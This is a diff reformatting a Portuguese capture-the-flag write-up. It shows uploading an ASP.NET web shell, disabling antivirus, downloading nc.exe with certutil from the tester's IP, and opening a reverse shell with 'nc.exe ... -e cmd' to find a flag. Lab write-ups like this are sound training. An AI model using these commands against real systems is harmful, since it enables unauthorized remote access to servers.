@@ -1,57 +1,81 @@
-# Depois de levantar informações especificas como o lugar ontem tem uma falha para upar arquivos e deletar , o lugar onde essee arquivos ficam armazenados e ainda conseguir acessar ele.
 
-## Resumindo tudo favoravel para subir o shell
+# Depois de levantar informações específicas como o lugar onde tem uma falha para upar arquivos e deletar, o lugar onde esses arquivos ficam armazenados e ainda conseguir acessar ele.
 
-## Contexto para subir o shell sabendo a tecnologia do site que é ASP NET eu posso ta procurando um Shell que seja ASPNET.aspx upar no servidor e acessar ele e conseguir injetar comandos 
-## 1° - Procurar no google o SHell : github: shell for ASP.aspx 
-## 2° - Desligar o antivirus do computador
+## Resumindo: tudo favorável para subir o shell.
+
+## Contexto para subir o shell:
+Sabendo que a tecnologia do site é ASP.NET, podemos procurar um Shell que seja `.ASPNET.aspx`, upar no servidor e acessar ele para injetar comandos.
+
+1️⃣ - Procurar no Google o Shell: `github: shell for ASP.aspx`  
+2️⃣ - Desligar o antivírus do computador.  
 ![image](https://github.com/user-attachments/assets/d7a9b6dd-d1a3-463e-a716-488dfa836c1a)
-## 3° - salvar esse shell no arquivo .aspx
+
+3️⃣ - Salvar esse shell no arquivo `.aspx`.  
 ![image](https://github.com/user-attachments/assets/bf04650c-c0af-4cfc-81c8-9d19ef13cf80)
-## com ele em mãos é so subir no servidor e acessar
-## acessando o local onde descobrimos no DIRSEARCH que é o magnam que faz o trabalho do banco de dados
+
+💻 Com ele em mãos, é só subir no servidor e acessar.
+
+Acessando o local que descobrimos no DIRSEARCH que é o `magnam` (faz o trabalho do banco de dados).  
 ![image](https://github.com/user-attachments/assets/b4f7bf34-f8f4-40a1-b90b-32065c645192)
-## upando arquivo
+
+⬆️ Upando arquivo:  
 ![image](https://github.com/user-attachments/assets/f4923442-491e-49ad-9738-48ca914b4726)
-## arquivo UPADO só acessa agora
+
+✅ Arquivo UPADO, só acessar agora:  
 ![image](https://github.com/user-attachments/assets/0afbee35-4be9-4f1b-acad-2c5cac33dce3)
-## acessando o arquivo 
+
+🔎 Acessando o arquivo:  
 ![image](https://github.com/user-attachments/assets/634bf72b-4d67-446c-8acc-9bc82da34bbb)
-## shell.aspx subiu porem voce ainda nao tem cotrole total para navegar nos diretorios para fazer um enumeração de arquivos
-## proximo passo é baixar o nc.exe e colocar em uma pasta no seu propio windons instalar o python criar uma pasta colocar o arquivo nc.exe lá dentro e dai iniciar o servidor python com o nc.exe disponivel para dowload
+
+⚠️ `shell.aspx` subiu, porém você ainda não tem controle total para navegar nos diretórios e fazer uma enumeração de arquivos.
+
+💡 Próximo passo:  
+- Baixar o `nc.exe`.
+- Colocar em uma pasta no seu próprio Windows.
+- Instalar o Python.
+- Colocar o arquivo `nc.exe` lá dentro.
+- Iniciar o servidor Python com o `nc.exe` disponível para download.  
 ![image](https://github.com/user-attachments/assets/0b399e9c-440c-48b4-b4c5-8434dad98986)
-## coloquei em uma pasta com o nome "Nova Pasta" e inciei o servidor pyhton pelo cmd do meu windons
+
+📂 Coloquei em uma pasta com o nome "Nova Pasta" e iniciei o servidor Python pelo CMD do Windows.  
 ![image](https://github.com/user-attachments/assets/919c4e88-32e4-4459-adcb-700e80e462e0)
-## agora para baixar usando o shell que eu subi vai ser usado o comando:
-```txt
-  certutil -urlcache -split -f http://192.168.100.168/nc.exe c:\users\public\nc.exe
 
-    o Certutil serve para baixar arquivos em um windons e como esta em um server http só vai ser preciso colocar a url,
-    com o endereço de ip do meu computador windons e o arquivo que vai ser baixado que é o nc.exe,
-    e dai ele vai salvar no users public que qualqr um tem acesso com o nome de nc.exe
+📥 Agora para baixar usando o shell que subi, use o comando:
+
 ```
-## depois de rodar o comando vai dizer que deu sucesso:
+certutil -urlcache -split -f http://192.168.100.168/nc.exe c:\users\public\nc.exe
+
+O Certutil serve para baixar arquivos no Windows. Como está em um servidor HTTP,
+basta informar o IP do seu PC e o nome do arquivo para ele salvar no `users/public`
+com o nome `nc.exe`.
+```
+
+✅ Depois de rodar o comando, o sistema vai confirmar que deu sucesso:  
 ![image](https://github.com/user-attachments/assets/20dfd46a-d056-4dd6-ad33-0ae350bcd4a4)
-## agora é so verificar se realmente ele foi baixado na pasta publica (ele está lá):
+
+📁 Agora é só verificar se ele realmente foi baixado na pasta pública:  
 ![image](https://github.com/user-attachments/assets/7a58ca23-e926-482a-bac3-34088934c625)
-## arquivo upado precisamos acessar a shell do nosso win ( colocamos o nc para escutar na porta 4444 ):
+
+🔊 Arquivo upado, precisamos acessar a shell do nosso Windows. Coloque o `nc` para escutar na porta `4444`:  
 ![image](https://github.com/user-attachments/assets/a5debaf5-4d6b-424a-aa99-a6b3c91a7d13)
-## porta escutando é so executar o comando: 
-```txt
-   c:\users\public\nc.exe 192.168.100.168 4444 -e cmd 
 
-    nesse comando ele ta executando o arquivo que ta no public passando o ip e a porta e o tipo de comando que vai ser usado 
-    o ip : da minha maq win , a porta que foi selecionada para falar que estava escutando do outro lado , e o e para executar o cmd no meu win
+⚡ Porta escutando, basta executar o comando:
+
 ```
+c:\users\public\nc.exe 192.168.100.168 4444 -e cmd
+
+Esse comando executa o `nc.exe`,
+passando o IP e a porta para conectar e o `-e` para executar o `cmd` do Windows.
+```
+
+📡 Após executar o comando, a porta que está escutando recebe o `cmd`:  
 ![image](https://github.com/user-attachments/assets/c7eeac35-cce7-4d21-9c70-6cfaa5b68f9b)
-## depois de executar o comando a porta que esta escutando vai receber o cmd 
+
+💻 Agora é só fazer a enumeração de arquivos e encontrar a flag do arquivo sensível:  
 ![image](https://github.com/user-attachments/assets/e768c7eb-f61c-4241-8d7e-e2997555c53c)
-## agora é so fazer enumeração de arquivos e encotrar a flag do arquivo sensivel:
+
+📦 Arquivo sensível encontrado:  
 ![image](https://github.com/user-attachments/assets/12899b1c-0cff-4350-b986-3f8b8d5d0c39)
-## Arquivo sensivel encontrado:
+
+🏁 FLAG encontrada:  
 ![image](https://github.com/user-attachments/assets/822f7405-3985-4a8a-80b7-05fbe0a33b31)
-
-
-
-
-
